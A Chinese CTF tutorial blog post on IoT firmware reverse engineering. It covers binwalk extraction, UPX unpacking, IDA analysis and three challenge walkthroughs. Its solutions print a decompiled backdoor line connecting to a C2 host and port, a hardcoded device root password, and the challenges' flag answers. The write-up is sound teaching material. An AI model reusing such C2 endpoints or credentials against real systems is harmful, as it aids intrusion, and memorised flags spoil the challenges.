+++
date = '2026-06-06T10:00:00+08:00'
draft = false
title = 'CTF 固件逆向入门：IoT固件分析、binwalk提取与后门追踪'
tags = ['CTF', '逆向', '固件', 'IoT', 'binwalk', 'firmware', '后门', 'UPX', 'SquashFS']
categories = ['逆向']
+++

> CTF 中的固件题（Firmware Reverse）是一类结合逆向工程与 IoT 安全的综合题型。选手需要从路由器、工控设备等固件镜像中提取文件系统、定位后门或硬编码凭证、逆向分析关键程序，最终拿到 flag。本文先系统梳理固件分析的核心知识点，再通过三道真实 CTF 赛题演示完整的解题流程。

参考文章：[固件分析技术(4)-CTF赛题（FreeBuf）](https://www.freebuf.com/articles/endpoint/275448.html)

---

## 一、知识点：固件基础

### 1.1 什么是固件

固件是嵌入式设备（路由器、摄像头、工控 PLC、智能家居等）的完整软件包，本质上是一个打包了 **Bootloader + Linux 内核 + 文件系统 + 应用程序** 的镜像文件。

```
固件镜像 (.bin)
├── Bootloader（如 U-Boot）       硬件初始化、加载内核
├── Linux Kernel                  压缩存储（gzip/lzma）
├── Root Filesystem               核心：/bin /etc /usr /tmp /www ...
└── 厂商自定义区域                 可能含密钥、配置
```

### 1.2 常见固件格式

| 格式 | 典型设备 | 头部特征 |
|------|----------|----------|
| TP-LINK `.bin` | TP-Link 路由器 | `TP-LINK Technologies` |
| D-Link `.bin` | D-Link 路由器 | `SHRS` 或加密头 |
| OpenWrt `.img` | 各种路由器 | SquashFS + JFFS2 |
| Schneider `.bin` | 工控 PLC 模块 | 厂商自定义头部 |
| Android `.img` | Android 设备 | ext4 / erofs |

### 1.3 常见文件系统

| 文件系统 | 解压工具 | 常见场景 |
|----------|----------|----------|
| **SquashFS** | `unsquashfs` | 路由器固件最常见 |
| **JFFS2** | `jefferson` | 旧款嵌入式设备 |
| **CramFS** | `fsck.cramfs` | 早期嵌入式 |
| **ext4** | `mount` | Android / 工控 |

---

## 二、知识点：核心工具

### 2.1 工具速查表

| 工具 | 用途 | 说明 |
|------|------|------|
| **binwalk** | 固件扫描与提取 | `binwalk -e firmware.bin` 一键提取 |
| **file** | 识别文件/架构 | 判断 ELF 是 ARM、MIPS 还是 x86 |
| **strings** | 提取可读字符串 | 快速搜 flag / password / http |
| **hexdump / xxd** | 查看二进制头部 | 确认固件结构和偏移 |
| **unsquashfs** | 解压 SquashFS | `apt install squashfs-tools` |
| **IDA Pro / Ghidra** | 反编译二进制程序 | 固件逆向的核心 |
| **UPX** | 脱壳 | `upx -d packed_binary` |
| **DIE** | 查壳 | Detect It Easy，判断是否加壳 |

### 2.2 binwalk 核心用法

```bash
# 扫描固件结构
binwalk firmware.bin

# 自动提取（生成 _firmware.bin.extracted/ 目录）
binwalk -e firmware.bin

# 递归提取嵌套文件
binwalk -eM firmware.bin

# 手动提取（binwalk 自动提取失败时）
dd if=firmware.bin of=rootfs.squashfs bs=1 skip=<偏移>
unsquashfs rootfs.squashfs
```

### 2.3 固件中常见目标文件

| 目标 | 路径/特征 | 用途 |
|------|-----------|------|
| 用户密码 | `etc/passwd`、`etc/shadow` | 密码哈希可破解 |
| 后门程序 | `/tmp/`、`/usr/bin/` 中的异常可执行文件 | CTF 高频考点 |
| 硬编码凭证 | `strings` 搜索 password/passwd/root | 工控设备常见 |
| Web 后门 | `www/` 目录下的 `.cgi`、`.php` | 路由器 Web 管理 |
| 动态库 | `lib/`、`home/*/FuncDll/` | 二次开发程序的依赖 |
| 配置文件 | `*.conf`、`*.cfg` | 可能含密钥或后门地址 |
---

## 三、知识点：解题方法论

### 3.1 通用解题流程

```
拿到固件
|
+-- 1. file + binwalk：确认类型，扫描结构
|
+-- 2. binwalk -e：提取文件系统
|       失败? -> Linux/WSL 环境重试，或 dd 手动提取
|
+-- 3. strings + grep：快速搜索关键字
|       flag / password / passwd / http / port / backdoor
|
+-- 4. find：定位可疑可执行文件
|       find . -type f -executable
|       find . -name "*.cgi"
|
+-- 5. file 确认架构 -> IDA/Ghidra 反编译
|       有壳? -> DIE 查壳 -> UPX 脱壳 -> 重新分析
|
+-- 6. 字符串窗口（Shift+F12）找域名/IP/端口
|       交叉引用定位关键函数 -> F5 反编译
|
+-- 7. 根据题目要求构造 flag
        MD5? 拼接? 直接输出?
```

### 3.2 三类固件 CTF 题的解题模式

| 题型 | 特征 | 解题关键 |
|------|------|----------|
| **后门程序分析** | 提取出 ELF 可执行文件 | 脱壳 -> IDA 字符串窗口 -> 找 C2 地址 |
| **硬编码凭证搜索** | 工控/二次设备固件 | `strings` + IDA Names 视图搜索密码 |
| **Web 接口漏洞** | 路由器固件含 `/www/` | 审计 CGI/PHP 源码找命令注入 |

---

## 四、实战一：BUUCTF-firmware（后门程序分析）

> 参考自 [FreeBuf 固件分析技术(4)](https://www.freebuf.com/articles/endpoint/275448.html)，同时也是校赛 re4 题的原题。

### 4.1 题目信息

| 项目 | 内容 |
|------|------|
| 文件名 | firmware.bin / re4.bin |
| 文件类型 | TP-LINK firmware (941 v7, v3.15.36) |
| 大小 | ~4MB |
| 题型 | 固件逆向 -- 后门程序 C2 地址分析 |
| 题目要求 | 找到后门程序使用的远程服务器和端口，提交 MD5 值作为 flag |
| 来源 | BUUCTF / 校赛 |

### 4.2 解题过程

**Step 1：binwalk 提取固件**

```bash
$ binwalk re4.bin
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             TP-LINK firmware header, model ID: 941
512           0x200           LZMA compressed data
1048576       0x100000        Squashfs filesystem, little endian, version 4.0

$ binwalk -e re4.bin
```

> **坑点**：Windows 下 binwalk 提取 SquashFS 可能失败（缺少 `unsquashfs`），需要切到 Linux/WSL 环境。

**Step 2：定位后门程序**

提取文件系统后，在 `/tmp` 目录下发现后门程序：

```bash
$ ls squashfs-root/tmp/
backdoor    # 异常可执行文件！

$ file squashfs-root/tmp/backdoor
backdoor: ELF 32-bit MSB executable, ARM, EABI5 version 1
```

**Step 3：查壳 + 脱壳**

用 DIE 查壳，发现有 **UPX 壳**：

```bash
$ upx -d backdoor -o backdoor_unpacked
```

**Step 4：IDA 分析，提取关键信息**

脱壳后用 IDA 打开，**查看字符串窗口**（View -> Open subviews -> Strings）：

找到 `echo.byethost51.com`，通过交叉引用定位到 `initConnection` 函数，F5 反编译找到端口 `36667`。

```c
void initConnection() {
    connect(sock, "echo.byethost51.com", 36667);
}
```

**Step 5：MD5 计算得到 flag**

```python
import hashlib
domain = "echo.byethost51.com"
flag = "flag{" + hashlib.md5(domain.encode()).hexdigest() + "}"
print(flag)
# flag{33a422c45d551ac6e4756f59812a954b}
```

### 4.3 知识点总结

| 知识点 | 说明 |
|--------|------|
| **SquashFS 文件系统** | 路由器固件最常用，`binwalk -e` + `unsquashfs` 解压 |
| **UPX 壳** | 最常见的压缩壳，`upx -d` 一行脱壳 |
| **ARM/MIPS 架构识别** | `file` 命令判断架构，IDA 加载时选对应处理器 |
| **字符串窗口** | IDA 的 Shift+F12 是固件题的"第一切入点" |
| **后门特征** | 硬编码域名/IP + 端口号，通常在连接函数中 |
---

## 五、实战二：CTFHUB-二次设备固件逆向（硬编码凭证）

> 参考自 [FreeBuf 固件分析技术(4)](https://www.freebuf.com/articles/endpoint/275448.html)

### 5.1 题目信息

| 项目 | 内容 |
|------|------|
| 固件类型 | 二次设备（工控/电力行业） |
| 题型 | 固件逆向 -- 硬编码/后门口令搜索 |
| 题目要求 | 分析固件，找到硬编码或厂商后门口令 |
| 来源 | CTFHub |

### 5.2 解题过程

**Step 1：固件提取**

解压固件后，目录结构如下：

```
home/
├── FuncDll/      # 动态链接库
├── Icon/          # 图标和配置文件
├── NandFlash/     # 存储
├── Process/       # 运行的程序代码
└── lost+found/    # 空
```

**Step 2：关键字搜索**

题目要求找硬编码/后门口令，直接用 `strings` + `grep` 搜索：

```bash
$ strings Process/JZPHMISystem | grep -iE "passwd|password|root|admin"
inputPassword
passWd.c
rootPasswd
passWdPID
InputPwd_pro
InputPwdPro
```

**Step 3：IDA 分析**

将 `JZPHMISystem` 拖入 IDA 分析。

在函数列表中搜索 `inputPassword` 和 `InputPwd_pro`，但找不到 `rootPasswd`。

> **关键技巧**：`rootPasswd` 不是函数，是一个**全局变量（符号）**。需要在 IDA 中通过 **View -> Open subviews -> Names** 查找，而不是在函数列表中找。

在 Names 视图中找到 `rootPasswd`，双击跳转，数据段中显示：

```
rootPasswd: db '689078',0
```

**Step 4：得到 flag**

```
flag{689078}
```

### 5.3 知识点总结

| 知识点 | 说明 |
|--------|------|
| **工控固件结构** | 二次设备固件通常含 `Process/`（程序）、`FuncDll/`（库）、`NandFlash/`（存储） |
| **strings 搜索** | 固件分析的第一步，搜 password/passwd/root/admin 等关键字 |
| **IDA Names 视图** | 全局变量/符号不在函数列表中，需要通过 Names 视图查找 |
| **硬编码凭证** | 工控设备常见安全问题，密码直接写死在程序中 |

---

## 六、实战三：CTFHUB-简单的固件逆向分析（工控 PLC）

> 参考自 [FreeBuf 固件分析技术(3)-漏洞复现](https://www.freebuf.com/articles/endpoint/275448.html)

### 6.1 题目信息

| 项目 | 内容 |
|------|------|
| 固件类型 | 施耐德 PLC 以太网模块（noe77101） |
| 题型 | 固件逆向 -- 工控设备分析 |
| 来源 | CTFHub |

### 6.2 知识点总结

这道题涉及工控固件的特殊性：

| 知识点 | 说明 |
|--------|------|
| **PLC 固件结构** | 工控 PLC 固件通常包含引导程序、通信模块、逻辑程序 |
| **施耐德设备** | noe77101 是施耐德的以太网通信模块，固件结构与路由器不同 |
| **分析思路** | 同样是 binwalk 提取 + strings 搜索 + IDA 分析，但需要了解工控协议 |
---

## 七、解题方法论总结

### 7.1 固件 CTF 题的三大解题模式

```
模式一：后门程序分析（BUUCTF-firmware / 校赛 re4）
  binwalk 提取 -> find /tmp 找后门 -> 查壳脱壳 -> IDA 字符串窗口 -> 找 C2 地址

模式二：硬编码凭证搜索（CTFHUB-二次设备）
  binwalk 提取 -> strings 搜索 password -> IDA Names 视图 -> 找到明文密码

模式三：Web/应用层漏洞（路由器固件）
  binwalk 提取 -> 审计 www/ 目录 -> 代码审计找命令注入/后门接口
```

### 7.2 快速判断与行动

| 看到什么 | 立刻做什么 |
|----------|-----------|
| 文件头有厂商标识 | `binwalk -e` 提取 |
| 提取出 ELF 可执行文件 | `file` 确认架构 -> DIE 查壳 -> IDA 分析 |
| 文件有 UPX 壳 | `upx -d` 脱壳 |
| IDA 字符串窗口有域名/IP | 交叉引用 -> 找连接函数 -> 提取端口 |
| `strings` 搜到 password/passwd | 跟踪到 IDA -> Names 视图找全局变量 |
| 文件系统含 `/www/` 目录 | 审计 CGI/PHP 源码 |

### 7.3 常见坑点

| 坑 | 原因 | 解决方案 |
|----|------|----------|
| binwalk 提取 SquashFS 失败 | Windows 缺少 `unsquashfs` | 用 Linux / WSL |
| IDA 打不开文件 | 架构选择错误 | `file` 命令确认后选 ARM/MIPS/x86 |
| IDA F5 输出全是乱码 | 程序有壳 | DIE 查壳 -> `upx -d` 脱壳 |
| 找不到全局变量 | 在函数列表里找 | 用 View -> Names 视图 |
| `strings` 搜不到有用信息 | 关键字符串被加密或拆分 | IDA 交叉引用 + 动态调试 |

---

## 八、工具与环境速查

### 8.1 本机工具

| 工具 | 路径/安装方式 |
|------|---------------|
| IDA Pro 9.1 | `E:\ctf\tools\1-Reverse\IDA9.1\` |
| DIE 3.10 | `E:\ctf\tools\1-Reverse\die_win64_portable_3.10_x64\` |
| UPX 5.0.2 | `E:\ctf\tools\1-Reverse\upx-5.0.2-win64\upx.exe` |
| binwalk | `pip install binwalk`（建议在 Linux 中使用） |
| unsquashfs | `apt install squashfs-tools`（Linux） |

### 8.2 推荐学习资源

| 资源 | 说明 |
|------|------|
| [FreeBuf - 固件分析技术系列](https://www.freebuf.com/articles/endpoint/275448.html) | 固件分析入门四部曲，含工具使用、漏洞复现、CTF 赛题 |
| [CTF Wiki - 固件逆向](https://ctf-wiki.org/) | CTF 固件题分类与技巧 |
| [binwalk 官方 GitHub](https://github.com/ReFirmLabs/binwalk) | 固件分析工具文档 |

---

## 九、总结

固件 CTF 题的核心就是三步：

```
提取 -> 定位 -> 逆向
```

1. **提取**：`binwalk -e` 把文件系统解出来（失败就换 Linux）
2. **定位**：`strings` + `find` + `grep` 搜索后门、密码、可疑程序
3. **逆向**：`file` 确认架构 -> 查壳脱壳 -> IDA 分析字符串和函数

三道题覆盖了固件题最常见的两种题型：
- **后门程序分析**：重点在 IDA 字符串窗口和函数反编译
- **硬编码凭证搜索**：重点在 `strings` 搜索和 IDA Names 视图

> 本文解题过程参考了 [FreeBuf 固件分析技术(4)-CTF赛题](https://www.freebuf.com/articles/endpoint/275448.html) 及校赛真题。如有疑问欢迎交流。
